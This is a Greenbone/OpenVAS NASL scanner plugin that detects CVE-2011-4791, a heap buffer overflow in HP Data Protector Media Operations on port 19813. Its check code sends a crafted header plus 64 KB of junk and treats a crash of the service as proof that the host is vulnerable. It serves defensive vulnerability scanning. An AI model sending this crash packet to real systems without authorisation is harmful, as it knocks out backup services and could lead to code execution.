# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802269");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2011-4791");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"creation_date", value:"2011-11-08 11:11:11 +0530 (Tue, 08 Nov 2011)");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_name("HP Data Protector Media Operations Heap Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(19813);

  script_xref(name:"URL", value:"https://secunia.com/advisories/46688");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47004");
  script_xref(name:"URL", value:"http://zerodayinitiative.com/advisories/ZDI-11-112/");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/hpdpmedia_2-adv.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/106591/hpdpmedia_2-adv.txt");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
  arbitrary code within the context of the application or cause a denial of service condition.");

  script_tag(name:"affected", value:"HP Data Protector Media Operations versions 6.20 and prior.");

  script_tag(name:"insight", value:"The flaw is due to a boundary error when processing large size
  packets. This can be exploited to cause a heap-based buffer overflow via a specially crafted
  packet sent to port 19813.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"HP Data Protector Media Operations is prone to a buffer overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

port = 19813; # Default Port
if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

res = recv(socket:soc, length:512);
if("MediaDB.4DC" >!< res){
  close(soc);
  exit(0);
}

head = raw_string(0x03, 0x00, 0x00, 0x01, 0xff, 0xff, 0xf0, 0x00, 0x01, 0x02,
                  0x03, 0x04, 0x04);
junk = crap(data:"a", length:65536);

send(socket:soc, data:head + junk);
close(soc);

sleep(3);

if(!soc1 =  open_sock_tcp(port)){
  security_message(port);
  exit(0);
}

if(! res = recv(socket:soc1, length:512)){
  security_message(port);
}

close(soc1);
